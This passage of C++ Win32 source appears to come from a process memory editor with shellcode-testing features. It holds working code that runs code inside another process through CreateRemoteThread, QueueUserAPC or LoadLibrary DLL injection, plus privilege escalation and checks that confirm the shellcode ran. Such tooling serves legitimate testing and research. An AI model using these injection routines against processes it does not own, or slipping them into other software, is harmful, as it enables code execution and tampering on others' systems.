    THREADENTRY32 te; te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == currentPID)
                current.push_back(te.th32ThreadID);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
 
    if (!g_vsnap.taken) {
        char line[64]; sprintf_s(line, "  No snapshot – current thread count: %zu", current.size());
        AppendEditText(hLstVerify, line);
        return;
    }
 
    int newThreads = 0;
    for (DWORD tid : current) {
        bool found = false;
        for (DWORD old : g_vsnap.threadIds) if (old == tid) { found = true; break; }
        if (!found) {
            PVOID sa = NULL;
            HANDLE hTh = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid);
            if (hTh) { if (fn) fn(hTh, 9, &sa, sizeof(sa), NULL); CloseHandle(hTh); }
 
            MEMORY_BASIC_INFORMATION mbi = {}; const char* kind = "?";
            if (sa && VirtualQueryEx(hProcess, sa, &mbi, sizeof(mbi)) == sizeof(mbi)) {
                if      (mbi.Type == MEM_PRIVATE) kind = "PRIVATE";
                else if (mbi.Type == MEM_MAPPED)  kind = "MAPPED";
                else if (mbi.Type == MEM_IMAGE)   kind = "IMAGE";
            }
            char line[256];
            sprintf_s(line, "NEW  TID=%-10lu  start=0x%p  region=%s", tid, sa, kind);
            bool suspicious = (mbi.Type == MEM_PRIVATE || mbi.Type == MEM_MAPPED);
            VerifyLine(!suspicious, "%s", line);
            newThreads++;
        }
    }
 
    int goneThreads = 0;
    for (DWORD old : g_vsnap.threadIds) {
        bool found = false;
        for (DWORD cur : current) if (cur == old) { found = true; break; }
        if (!found) {
            char line[64]; sprintf_s(line, "GONE  TID=%lu", old);
            AppendEditText(hLstVerify, line);
            goneThreads++;
        }
    }
 
    if (newThreads == 0 && goneThreads == 0)
        AppendEditText(hLstVerify, "  No thread changes since snapshot.");
    else {
        char sum[128];
        sprintf_s(sum, "  Result: %d new thread(s), %d exited thread(s).", newThreads, goneThreads);
        AppendEditText(hLstVerify, sum);
    }
}
 
void VerifyCheckMemory() {
    VerifySep("MEMORY REGION DIFF  (new executable allocations since snapshot)");
    if (!hProcess) { AppendEditText(hLstVerify, "  Not attached."); return; }
 
    SYSTEM_INFO si; GetSystemInfo(&si);
    LPVOID addr = si.lpMinimumApplicationAddress;
    std::vector<VerifySnapshot::MemRec> current;
    while (addr < si.lpMaximumApplicationAddress) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi)) != sizeof(mbi)) break;
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |
                            PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
            VerifySnapshot::MemRec r;
            r.base = (uintptr_t)mbi.BaseAddress; r.size = mbi.RegionSize;
            r.protect = mbi.Protect; r.type = mbi.Type;
            current.push_back(r);
        }
        addr = (LPVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
    }
 
    if (!g_vsnap.taken) {
        char line[64];
        sprintf_s(line, "  No snapshot – current exec region count: %zu", current.size());
        AppendEditText(hLstVerify, line);
        return;
    }
 
    int newRegs = 0;
    for (auto& cr : current) {
        bool found = false;
        for (auto& sr : g_vsnap.memRegions)
            if (sr.base == cr.base && sr.size == cr.size) { found = true; break; }
        if (!found) {
            const char* prot = "EXEC";
            if     (cr.protect & PAGE_EXECUTE_READWRITE) prot = "RWX";
            else if(cr.protect & PAGE_EXECUTE_READ)      prot = "RX";
            const char* mtype = cr.type == MEM_PRIVATE ? "PRIVATE"
                              : cr.type == MEM_MAPPED  ? "MAPPED" : "IMAGE";
            char line[256];
            sprintf_s(line, "NEW  0x%016llX  size=%s  prot=%-6s  type=%s",
                (unsigned long long)cr.base,
                FormatMemorySize(cr.size).c_str(), prot, mtype);
            bool suspicious = (cr.type == MEM_PRIVATE) &&
                               (cr.protect & PAGE_EXECUTE_READWRITE);
            VerifyLine(!suspicious, "%s%s", line,
                suspicious ? "  <-- shellcode buffer" : "");
            newRegs++;
        }
    }
 
    if (newRegs == 0)
        AppendEditText(hLstVerify, "  No new executable regions since snapshot.");
    else {
        char sum[128];
        sprintf_s(sum, "  Result: %d new executable region(s).", newRegs);
        AppendEditText(hLstVerify, sum);
    }
}
 

void VerifyCheckSentinel() {
    VerifySep("SENTINEL / CANARY CHECK  (did shellcode reach this address?)");
    if (!hProcess) { AppendEditText(hLstVerify, "  Not attached."); return; }
    char addrStr[64] = {}, valStr[32] = {};
    GetWindowTextA(hEditSentinelAddr, addrStr, 64);
    GetWindowTextA(hEditSentinelVal, valStr, 32);
    LPVOID addr = (LPVOID)(uintptr_t)strtoull(addrStr, nullptr, 0);
    int want = atoi(valStr);
    if (!addr || (uintptr_t)addr < 0x10000) {
        AppendEditText(hLstVerify, "  Enter a valid sentinel address.");
        return;
    }
    int cur = 0; SIZE_T r;
    if (!ReadProcessMemory(hProcess, addr, &cur, 4, &r) || r < 4) {
        VerifyLine(false, "0x%p  read FAILED (invalid/unreadable address)", addr);
        return;
    }
    bool hit = (cur == want);
    char line[256];
    sprintf_s(line, "Sentinel @ 0x%p  read=%d  expected=%d", addr, cur, want);
    VerifyLine(hit, "%s  -->  %s", line,
        hit ? "value matches – shellcode did NOT change it (set a DIFFERENT value)"
            : "value differs – shellcode REACHED and modified this address  ✓");
    BYTE hex4[4]; ReadProcessMemory(hProcess, addr, hex4, 4, &r);
    char hexline[64];
    sprintf_s(hexline, "  Raw bytes: %02X %02X %02X %02X", hex4[0], hex4[1], hex4[2], hex4[3]);
    AppendEditText(hLstVerify, hexline);
}
 
void RunVerifyAll() {
    ClearEditText(hLstVerify);
    SYSTEMTIME now; GetLocalTime(&now);
    char hdr[256];
    sprintf_s(hdr, "=== VERIFICATION REPORT  %02d:%02d:%02d  PID=%d ===",
        now.wHour, now.wMinute, now.wSecond, currentPID);
    AppendEditText(hLstVerify, hdr);
    VerifyCheckValues();
    VerifyCheckModules();
    VerifyCheckThreads();
    VerifyCheckMemory();
    VerifyCheckSentinel();
    AppendEditText(hLstVerify, "\r\n=== END OF REPORT ===");
    LogToStatus("Verification complete – see Verify tab");
}

void LogToTrigger(const char* msg, bool error) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buf[512];
    sprintf_s(buf, "[%02d:%02d:%02d]  %s", st.wHour, st.wMinute, st.wSecond, msg);
    AppendEditText(hLstTriggerLog, buf);
    if (error) MessageBeep(MB_ICONERROR);
}

void TriggerShellcode() {
    if (!hProcess || !currentPID) {
        LogToTrigger("Not attached to a process", true);
        return;
    }

    char addrStr[64] = { 0 };
    GetWindowTextA(hEditTriggerAddr, addrStr, 64);
    uintptr_t targetAddr = (uintptr_t)strtoull(addrStr, nullptr, 0);
    if (!targetAddr) {
        LogToTrigger("Invalid target address", true);
        return;
    }

    int method = (int)SendMessage(hCmbTriggerMethod, CB_GETCURSEL, 0, 0);

    if (method == 0) {
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)targetAddr, NULL, 0, NULL);
        if (hThread) {
            DWORD tid = GetThreadId(hThread);  
            g_lastCreatedThreadId = tid;
            char msg[256];
            sprintf_s(msg, "CreateRemoteThread at 0x%llX succeeded (thread handle %p, TID=%lu)",
                (unsigned long long)targetAddr, hThread, tid);
            LogToTrigger(msg);
            char tidStr[16];
            sprintf_s(tidStr, "%lu", tid);
            SetWindowTextA(hEditApcTid, tidStr);
            CloseHandle(hThread);
        } else {
            char msg[256];
            sprintf_s(msg, "CreateRemoteThread failed, error %lu", GetLastError());
            LogToTrigger(msg, true);
        }
    }
    else if (method == 1) {
        char tidStr[32] = { 0 };
        GetWindowTextA(hEditApcTid, tidStr, 32);
        DWORD tid = (DWORD)strtoul(tidStr, nullptr, 0);
        if (!tid) {
            LogToTrigger("Invalid thread ID for APC", true);
            return;
        }
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
        if (!hThread) {
            char msg[256];
            sprintf_s(msg, "OpenThread(%lu) failed, error %lu", tid, GetLastError());
            LogToTrigger(msg, true);
            return;
        }
        if (QueueUserAPC((PAPCFUNC)targetAddr, hThread, 0)) {
            char msg[256];
            sprintf_s(msg, "APC queued to TID %lu (address 0x%llX)", tid, (unsigned long long)targetAddr);
            LogToTrigger(msg);
        } else {
            char msg[256];
            sprintf_s(msg, "QueueUserAPC failed, error %lu", GetLastError());
            LogToTrigger(msg, true);
        }
        CloseHandle(hThread);
    }
    else if (method == 2) {
        char dllPath[MAX_PATH] = { 0 };
        GetWindowTextA(hEditScDllPath, dllPath, MAX_PATH);
        if (!dllPath[0]) {
            LogToTrigger("No DLL path specified (use Shellcode Exec tab to set DLL path)", true);
            return;
        }
        char funcName[256] = { 0 };
        GetWindowTextA(hEditScExportFunc, funcName, 256);
        if (!funcName[0]) {
            LogToTrigger("No export function name specified", true);
            return;
        }

        LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pRemotePath) {
            LogToTrigger("VirtualAllocEx for DLL path failed", true);
            return;
        }
        SIZE_T written = 0;
        if (!WriteProcessMemory(hProcess, pRemotePath, dllPath, strlen(dllPath) + 1, &written)) {
            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
            LogToTrigger("WriteProcessMemory for DLL path failed", true);
            return;
        }
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemotePath, 0, NULL);
        if (!hThread) {
            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
            LogToTrigger("CreateRemoteThread (LoadLibrary) failed", true);
            return;
        }
        WaitForSingleObject(hThread, 10000);
        DWORD hMod = 0;
        GetExitCodeThread(hThread, &hMod);
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        if (!hMod) {
            LogToTrigger("LoadLibrary failed – DLL not loaded (wrong architecture?)", true);
            return;
        }

        HMODULE remoteBase = FindModuleByPath(currentPID, dllPath);
        if (!remoteBase) {
            LogToTrigger("DLL loaded but cannot find its base address", true);
            return;
        }

        DWORD rva = GetExportRVA(dllPath, funcName);
        if (rva == 0) {
            char err[256];
            sprintf_s(err, "Export '%s' not found in DLL", funcName);
            LogToTrigger(err, true);
            return;
        }

        LPVOID remoteFunc = (LPVOID)((uintptr_t)remoteBase + rva);
        HANDLE hCall = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)remoteFunc, NULL, 0, NULL);
        if (hCall) {
            char msg[512];
            sprintf_s(msg, "DLL export '%s' executed at 0x%p (DLL base 0x%p)",
                funcName, remoteFunc, remoteBase);
            LogToTrigger(msg);
            CloseHandle(hCall);
            PopulateModuleList();
        } else {
            char msg[256];
            sprintf_s(msg, "CreateRemoteThread for export failed, error %lu", GetLastError());
            LogToTrigger(msg, true);
        }
    }
}

static void EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) return;
    TOKEN_PRIVILEGES tp = {};
    if (LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid)) {
        tp.PrivilegeCount=1; tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);
    }
    CloseHandle(hToken);
}

static bool IsElevated() {
    BOOL elevated=FALSE; HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken)) {
        TOKEN_ELEVATION te; DWORD sz=sizeof(te);
        if (GetTokenInformation(hToken,TokenElevation,&te,sizeof(te),&sz)) elevated=te.TokenIsElevated;
        CloseHandle(hToken);
    }
    return elevated!=FALSE;
}

static void RelaunchAsAdmin() {
    char path[MAX_PATH]; GetModuleFileNameA(NULL,path,MAX_PATH);
    ShellExecuteA(NULL,"runas",path,NULL,NULL,SW_SHOW); ExitProcess(0);
}

void LogToStatus(const char* msg, bool error) {
    char buf[512]; SYSTEMTIME st; GetLocalTime(&st);
    sprintf_s(buf,"[%02d:%02d:%02d]  %s",st.wHour,st.wMinute,st.wSecond,msg);
    SetWindowTextA(hStatusWnd,buf);
    if (error) { SetWindowTextA(hStatusWnd,buf); MessageBeep(MB_ICONERROR); }
}

std::string FormatMemorySize(SIZE_T bytes) {
    std::stringstream ss;
    if      (bytes<1024)             ss<<bytes<<" B";
    else if (bytes<1024*1024)        ss<<bytes/1024<<" KB";
    else if (bytes<1024*1024*1024)   ss<<bytes/(1024*1024)<<" MB";
    else                             ss<<bytes/(1024ULL*1024ULL*1024ULL)<<" GB";
    return ss.str();
}

LPVOID GetBaseAddress() {
    HANDLE h=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,currentPID);
    if (!h) return nullptr;
    HMODULE mods[1024]; DWORD needed; LPVOID base=nullptr;
    if (EnumProcessModules(h,mods,sizeof(mods),&needed)) base=mods[0];
    CloseHandle(h); return base;
}

void CopyEditToClipboard(HWND hEdit) {
    int len = GetWindowTextLengthA(hEdit);
    if (len<=0) { LogToStatus("Nothing to copy",true); return; }
    std::string buf(len+1,'\0');
    GetWindowTextA(hEdit,&buf[0],len+1);
    if (!OpenClipboard(hMainWnd)) return;
    EmptyClipboard();
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE,(len+1));
    if (hMem) { memcpy(GlobalLock(hMem),buf.c_str(),len+1); GlobalUnlock(hMem); SetClipboardData(CF_TEXT,hMem); }
    CloseClipboard();
    char msg[64]; sprintf_s(msg,"Copied %d chars to clipboard",len);
    LogToStatus(msg);
}

void AppendEditText(HWND hEdit, const char* line) {
    int len = GetWindowTextLengthA(hEdit);
    SendMessage(hEdit, EM_SETSEL, len, len);
    RCEF_CF cf={};
    cf.cbSize=sizeof(cf);
    cf.dwMask=CFM_COLOR;
    cf.crTextColor=CLR_TEXT_LIST;
    SendMessage(hEdit,EM_SETCHARFORMAT,SCF_SELECTION,(LPARAM)&cf);
    if (len>0) SendMessageA(hEdit, EM_REPLACESEL, FALSE, (LPARAM)"\r\n");
    SendMessageA(hEdit, EM_REPLACESEL, FALSE, (LPARAM)line);
    SendMessage(hEdit, EM_SCROLLCARET, 0, 0);
}

void SetEditText(HWND hEdit, const char* text) {
    SetWindowTextA(hEdit, text);
    SendMessage(hEdit, EM_SETSEL, 0, 0);
    SendMessage(hEdit, EM_SCROLLCARET, 0, 0);
}


void ClearEditText(HWND hEdit) { SetWindowTextA(hEdit,""); }

std::vector<std::pair<DWORD,std::string>> SearchProcessesByName(const std::string& search) {
    std::vector<std::pair<DWORD,std::string>> results;
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (snap==INVALID_HANDLE_VALUE) return results;
    PROCESSENTRY32 pe; pe.dwSize=sizeof(pe);
    if (Process32First(snap,&pe)) {
        do {
            std::string name(pe.szExeFile);
            std::string sl=search,nl=name;
            std::transform(sl.begin(),sl.end(),sl.begin(),::tolower);
            std::transform(nl.begin(),nl.end(),nl.begin(),::tolower);
            if (search.empty()||nl.find(sl)!=std::string::npos)
                results.push_back({pe.th32ProcessID,name});
        } while (Process32Next(snap,&pe));
    }
    CloseHandle(snap); return results;
}


size_t GetDataTypeSize(int dt) {
    switch(dt){case DT_INT32:return 4;case DT_INT16:return 2;case DT_INT8:return 1;
               case DT_INT64:return 8;case DT_FLOAT:return 4;case DT_DOUBLE:return 8;default:return 4;}
}

std::string FormatTypedValue(const BYTE* data, int dt) {
    char buf[128]={};
    switch(dt){
        case DT_INT32:  sprintf_s(buf,"%d",    *(int32_t*)data);  break;
        case DT_INT16:  sprintf_s(buf,"%d",    (int)*(int16_t*)data); break;
        case DT_INT8:   sprintf_s(buf,"%d",    (int)*(int8_t*)data);  break;
        case DT_INT64:  sprintf_s(buf,"%lld",  *(int64_t*)data);  break;
        case DT_FLOAT:  sprintf_s(buf,"%.4f",  *(float*)data);    break;
        case DT_DOUBLE: sprintf_s(buf,"%.6f",  *(double*)data);   break;
        case DT_STRING: { char tmp[32]={};memcpy(tmp,data,31);sprintf_s(buf,"\"%s\"",tmp);break; }
        case DT_AOB:    sprintf_s(buf,"%02X %02X %02X %02X",data[0],data[1],data[2],data[3]);break;
    }
    return buf;
}

bool MatchesCondition(const BYTE* cur,const BYTE* prev,const BYTE* target,int dt,int sc,size_t sz) {
    switch(sc){
        case SC_EXACT:
            if(dt==DT_FLOAT)  return fabsf(*(float*)cur -*(float*)target) <0.001f;
            if(dt==DT_DOUBLE) return fabs (*(double*)cur-*(double*)target)<0.00001;
            return memcmp(cur,target,sz)==0;
        case SC_CHANGED:   return prev&&memcmp(cur,prev,sz)!=0;
        case SC_UNCHANGED: return prev&&memcmp(cur,prev,sz)==0;
        case SC_INCREASED:
            if(!prev)return false;
            if(dt==DT_INT8)  return*(int8_t*)cur >*(int8_t*)prev;
            if(dt==DT_INT16) return*(int16_t*)cur>*(int16_t*)prev;
            if(dt==DT_INT64) return*(int64_t*)cur>*(int64_t*)prev;
            if(dt==DT_FLOAT) return*(float*)cur  >*(float*)prev;
            if(dt==DT_DOUBLE)return*(double*)cur >*(double*)prev;
            return*(int32_t*)cur>*(int32_t*)prev;
        case SC_DECREASED:
            if(!prev)return false;
            if(dt==DT_INT8)  return*(int8_t*)cur <*(int8_t*)prev;
            if(dt==DT_INT16) return*(int16_t*)cur<*(int16_t*)prev;
            if(dt==DT_INT64) return*(int64_t*)cur<*(int64_t*)prev;
            if(dt==DT_FLOAT) return*(float*)cur  <*(float*)prev;
            if(dt==DT_DOUBLE)return*(double*)cur <*(double*)prev;
            return*(int32_t*)cur<*(int32_t*)prev;
        case SC_UNKNOWN: return true;
    }
    return false;
}

bool ParseAOB(const char* pattern,std::vector<BYTE>& outBytes,std::vector<bool>& outMask) {
    outBytes.clear();outMask.clear();
    const char* p=pattern;
    while(*p){
        while(*p==' ')p++;
        if(!*p)break;
        if(p[0]=='?'){outBytes.push_back(0);outMask.push_back(true);p++;if(*p=='?')p++;}
        else if(isxdigit((unsigned char)p[0])&&isxdigit((unsigned char)p[1])){
            char h[3]={p[0],p[1],0};outBytes.push_back((BYTE)strtoul(h,nullptr,16));
            outMask.push_back(false);p+=2;
        }else{p++;}
    }
    return !outBytes.empty();
}

void UpdateScanCount() {
    char buf[64]; sprintf_s(buf,"Found: %zu",scanResults.size());
    SetWindowTextA(hStaticScanCount,buf);
}

void UpdateOffsetInfo() {
    if (!hasTrackedOffset){
        SetWindowTextA(hStaticOffsetInfo,"No offset tracked.  Select a scan result then click Set Offset.");return;
    }
    LPVOID base=GetBaseAddress();
    if(!base||!hProcess){
        char buf[256];sprintf_s(buf,"Tracked offset: +0x%llX  (attach to process to resolve)",trackedOffset);
        SetWindowTextA(hStaticOffsetInfo,buf);return;
    }
    LPVOID resolved=(LPVOID)((uintptr_t)base+(uintptr_t)trackedOffset);
    int val=ReadValueFromAddress(resolved);
    char buf[512];
    sprintf_s(buf,"Tracked offset: +0x%llX  ->  0x%p  |  Current int32: %d",trackedOffset,resolved,val);
    SetWindowTextA(hStaticOffsetInfo,buf);
}


void PopulateProcessListDlg(HWND hList,const std::string& filter){
    SendMessage(hList,LB_RESETCONTENT,0,0);
    for(auto& p:SearchProcessesByName(filter)){
        char entry[256];sprintf_s(entry,"PID: %-8d | %s",p.first,p.second.c_str());
        SendMessageA(hList,LB_ADDSTRING,0,(LPARAM)entry);
    }
}

struct ProcDlgData{HWND hList;HWND hSearch;};

LRESULT CALLBACK ProcDlgProc(HWND hDlg,UINT msg,WPARAM wParam,LPARAM lParam){
    static ProcDlgData* d=nullptr;
    switch(msg){
    case WM_CREATE:{
        d=(ProcDlgData*)((CREATESTRUCT*)lParam)->lpCreateParams;
        CreateWindowA("STATIC","Search:",WS_CHILD|WS_VISIBLE,10,10,55,22,hDlg,NULL,hInst,NULL);
        d->hSearch=CreateWindowA("EDIT","",WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,
            70,8,300,24,hDlg,(HMENU)ID_EDIT_SEARCH,hInst,NULL);
        CreateWindowA("BUTTON","Search",WS_CHILD|WS_VISIBLE,378,8,90,24,hDlg,(HMENU)ID_BTN_SEARCH_NAME,hInst,NULL);
        d->hList=CreateWindowA("LISTBOX","",WS_CHILD|WS_VISIBLE|WS_BORDER|WS_VSCROLL|LBS_NOTIFY,
            10,40,460,360,hDlg,(HMENU)ID_LST_PROCS,hInst,NULL);
        CreateWindowA("BUTTON","Select Process",WS_CHILD|WS_VISIBLE,340,410,130,28,hDlg,(HMENU)ID_BTN_SELECT_PROC,hInst,NULL);
        SendMessage(d->hList,WM_SETFONT,(WPARAM)hFontMono,TRUE);
        SendMessage(d->hSearch,WM_SETFONT,(WPARAM)hFontNormal,TRUE);
        PopulateProcessListDlg(d->hList,"");
        return 0;
    }
    case WM_COMMAND:{
        WORD id=LOWORD(wParam);
        if(id==ID_BTN_SEARCH_NAME||(id==ID_EDIT_SEARCH&&HIWORD(wParam)==EN_CHANGE)){
            char buf[256];GetWindowTextA(d->hSearch,buf,256);PopulateProcessListDlg(d->hList,buf);
        }
        bool sel=(id==ID_BTN_SELECT_PROC)||(id==ID_LST_PROCS&&HIWORD(wParam)==LBN_DBLCLK);
        if(sel){
            int idx=(int)SendMessage(d->hList,LB_GETCURSEL,0,0);
            if(idx!=LB_ERR){
                char entry[256];SendMessageA(d->hList,LB_GETTEXT,idx,(LPARAM)entry);
                const char* p=entry+5;while(*p==' ')p++;
                SetWindowTextA(hEditPID,std::to_string((DWORD)atoi(p)).c_str());
                DestroyWindow(hDlg);
            }
        }
        return 0;
    }
    case WM_DESTROY:d=nullptr;return 0;
    }
    return DefWindowProc(hDlg,msg,wParam,lParam);
}

void ShowProcessListDialog(){
    static bool registered=false;
    if(!registered){
        WNDCLASSA wc={};wc.lpfnWndProc=ProcDlgProc;wc.hInstance=hInst;
        wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);wc.lpszClassName="ProcDlgClass";
        wc.hCursor=LoadCursor(NULL,IDC_ARROW);RegisterClassA(&wc);registered=true;
    }
    ProcDlgData data={};
    HWND hDlg=CreateWindowExA(WS_EX_DLGMODALFRAME,"ProcDlgClass","Select Process",
        WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|WS_VISIBLE,150,120,490,470,hMainWnd,NULL,hInst,&data);
    if(!hDlg)return;
    MSG msg;
    while(IsWindow(hDlg)&&GetMessage(&msg,NULL,0,0)){TranslateMessage(&msg);DispatchMessage(&msg);}
}


bool AttachToProcess(DWORD pid){
    if(hProcess){CloseHandle(hProcess);hProcess=NULL;}
    hProcess=OpenProcess(PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_QUERY_INFORMATION,FALSE,pid);
    if(hProcess){
        currentPID=pid;
        UpdateProcessInfo();
        char buf[128];sprintf_s(buf,"Attached to PID: %d",pid);
        LogToStatus(buf);
        ShowMemoryMap();
        PopulateModuleList();
        UpdateOffsetInfo();
        SetTimer(hMainWnd,TIMER_WATCH,1000,NULL);
        SetTimer(hMainWnd,TIMER_HEALTH,2000,NULL);
        return true;
    }
    LogToStatus("Failed to attach - Run as Administrator!",true);
    return false;
}

void UpdateProcessInfo(){
    if(!currentPID)return;
    LPVOID base=GetBaseAddress();
    std::string name="Unknown";
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(snap!=INVALID_HANDLE_VALUE){
        PROCESSENTRY32 pe;pe.dwSize=sizeof(pe);
        if(Process32First(snap,&pe)){do{if(pe.th32ProcessID==currentPID){name=pe.szExeFile;break;}}while(Process32Next(snap,&pe));}
        CloseHandle(snap);
    }
    const char* arch="?";
    if(hProcess){BOOL isWow64=FALSE;IsWow64Process(hProcess,&isWow64);
#ifdef _WIN64
        arch=isWow64?"x86 (32-bit)":"x64 (64-bit)";
#else
        arch="x86 (32-bit)";
#endif
    }
    char info[512];
    sprintf_s(info,"Process: %s  |  PID: %d  |  Arch: %s  |  Base: 0x%p",name.c_str(),currentPID,arch,base);
    SetWindowTextA(hStaticProcessInfo,info);
    if(hProcess){
        HMODULE mods[1024];DWORD needed;
        if(EnumProcessModules(hProcess,mods,sizeof(mods),&needed)){
            MODULEINFO mi;
            if(GetModuleInformation(hProcess,mods[0],&mi,sizeof(mi))){
                sprintf_s(info,"Module: %s  |  Size: %s  |  Entry: 0x%p",
                    name.c_str(),FormatMemorySize(mi.SizeOfImage).c_str(),mi.EntryPoint);
                SetWindowTextA(hStaticModuleInfo,info);
            }
        }
    }
}


void ShowMemoryMap(){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    ClearEditText(hMemoryMapWnd);

    std::vector<uintptr_t> foundPtrs;
    for(LPVOID a:scanResults)foundPtrs.push_back((uintptr_t)a);

    SYSTEM_INFO si;GetSystemInfo(&si);
    LPVOID addr=si.lpMinimumApplicationAddress;

    AppendEditText(hMemoryMapWnd,"Base Address         | Size        | Type    | Protection    | Notes");
    AppendEditText(hMemoryMapWnd,"---------------------+-------------+---------+---------------+------------------------");

    int n=0;
    while(addr<si.lpMaximumApplicationAddress&&n<1000){
        MEMORY_BASIC_INFORMATION mbi;
        if(VirtualQueryEx(hProcess,addr,&mbi,sizeof(mbi))!=sizeof(mbi))break;
        if(mbi.State==MEM_COMMIT){
            const char* prot="OTHER";
            if     (mbi.Protect&PAGE_EXECUTE_READWRITE)prot="EXEC+RW";
            else if(mbi.Protect&PAGE_EXECUTE_READ)      prot="EXEC+R";
            else if(mbi.Protect&PAGE_READWRITE)         prot="READ/WRITE";
            else if(mbi.Protect&PAGE_READONLY)          prot="READ ONLY";
            else if(mbi.Protect&PAGE_EXECUTE)           prot="EXECUTE";
            else if(mbi.Protect&PAGE_WRITECOPY)         prot="WRITECOPY";
            const char* mtype="PRIV";
            if     (mbi.Type==MEM_IMAGE) mtype="IMAGE";
            else if(mbi.Type==MEM_MAPPED)mtype="MAPPED";
            uintptr_t rs=(uintptr_t)mbi.BaseAddress;
            int hits=0;
            for(uintptr_t fa:foundPtrs)if(fa>=rs&&fa<rs+mbi.RegionSize)hits++;
            char line[512];
            if(hits>0)sprintf_s(line,"0x%016llX | %11s | %-7s | %-13s | >>> %d RESULT(S) <<<",
                (unsigned long long)rs,FormatMemorySize(mbi.RegionSize).c_str(),mtype,prot,hits);
            else sprintf_s(line,"0x%016llX | %11s | %-7s | %s",
                (unsigned long long)rs,FormatMemorySize(mbi.RegionSize).c_str(),mtype,prot);
            AppendEditText(hMemoryMapWnd,line);
            n++;
        }
        addr=(LPVOID)((uintptr_t)mbi.BaseAddress+mbi.RegionSize);
    }
    char buf[128];sprintf_s(buf,"Memory map: %d committed regions",n);
    LogToStatus(buf);
}


int ReadValueFromAddress(LPVOID address){
    if(!hProcess)return 0;
    int v=0;SIZE_T r;ReadProcessMemory(hProcess,address,&v,4,&r);return v;
}

void WriteValueToAddress(LPVOID address,int value){
    if(!hProcess){LogToStatus("No process attached!",true);return;}
    BYTE orig[4];SIZE_T r;
    if(ReadProcessMemory(hProcess,address,orig,4,&r)){Backup4 bk;memcpy(bk.data,orig,4);backups[address]=bk;}
    BYTE nb[4];*(int*)nb=value;SIZE_T w;
    if(WriteProcessMemory(hProcess,address,nb,4,&w)){
        char buf[128];sprintf_s(buf,"Wrote int32 %d to 0x%p",value,address);
        LogToStatus(buf);ShowHexAtAddress(address,address);
    }else LogToStatus("Write failed - Run as Administrator!",true);
}


void ReadStringAtAddress(LPVOID address){
    if(!hProcess||!address){LogToStatus("No address selected",true);return;}
    BYTE raw[256]={};SIZE_T r;
    ReadProcessMemory(hProcess,address,raw,255,&r);

    
    char utf8[300]="UTF-8/ASCII: \"";
    int  utf8len=(int)strlen(utf8);
    for(int i=0;i<(int)r&&i<128;i++){
        char c=raw[i];
        if(c==0)break;
        if(c>=' '&&c<127){utf8[utf8len++]=c;}
        else{char esc[6];sprintf_s(esc,"\\x%02X",raw[i]);for(int k=0;esc[k];k++)utf8[utf8len++]=esc[k];}
    }
    utf8[utf8len++]='"';utf8[utf8len]=0;

    
    char utf16[300]="UTF-16LE: \"";
    int  u16len=(int)strlen(utf16);
    for(int i=0;i+1<(int)r&&i<254;i+=2){
        wchar_t wc=*(wchar_t*)&raw[i];
        if(wc==0)break;
        if(wc>=' '&&wc<127)utf16[u16len++]=(char)wc;
        else{char esc[8];sprintf_s(esc,"\\u%04X",wc);for(int k=0;esc[k];k++)utf16[u16len++]=esc[k];}
    }
    utf16[u16len++]='"';utf16[u16len]=0;

    
    char hexline[128]="Raw hex: ";
    for(int i=0;i<32&&i<(int)r;i++){char h[4];sprintf_s(h,"%02X ",raw[i]);strcat_s(hexline,h);}

    char combined[1024];
    sprintf_s(combined,
        "=== String Read @ 0x%p ===\r\n%s\r\n%s\r\n%s",
        address,utf8,utf16,hexline);

    
    MessageBoxA(hMainWnd,combined,"String Read",MB_OK|MB_ICONINFORMATION);
    LogToStatus("String read complete - see dialog");
}


void WriteStringToAddress(LPVOID address,bool utf16,bool useSyscall){
    if(!hProcess||!address){LogToStatus("Select an address first",true);return;}
    char txt[512]={};
    GetWindowTextA(hEditStrWrite,txt,512);
    if(!txt[0]){LogToStatus("Enter string text first",true);return;}

    bool protect = (SendMessage(hChkProtect,BM_GETCHECK,0,0)==BST_CHECKED);
    DWORD oldProt = 0;
    SIZE_T writeLen = 0;
    std::vector<wchar_t> wide;
    if (!utf16) {
        writeLen = strlen(txt) + 1;
    } else {
